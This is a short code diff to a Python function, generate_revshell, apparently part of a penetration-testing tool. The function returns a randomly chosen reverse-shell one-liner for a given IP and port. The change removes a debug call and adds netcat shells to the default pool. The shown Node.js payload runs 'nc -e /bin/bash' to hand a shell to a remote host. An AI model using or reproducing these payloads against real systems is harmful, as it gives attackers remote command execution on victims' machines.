@@ -20,7 +20,6 @@ def generate_revshell(ip_addr: str, port: int, *args: (None, str)) -> str:
         node_shells = [f'''require('child_process').exec('nc -e /bin/bash {ip_addr} {port}')''']
 
         if args[0] is not None:
-            ic(args[0])
             match args[0]:
                 case "php":
                     rev_shell = rand.choice(php_shells)
@@ -44,6 +43,6 @@ def generate_revshell(ip_addr: str, port: int, *args: (None, str)) -> str:
                     rev_shell = rand.choice(node_shells)
                     return rev_shell
 
-        return rand.choice(php_shells + bash_shells + python_shells)
+        return rand.choice(php_shells + bash_shells + python_shells + nc_shells)
     except Exception as e:
         ic(e)
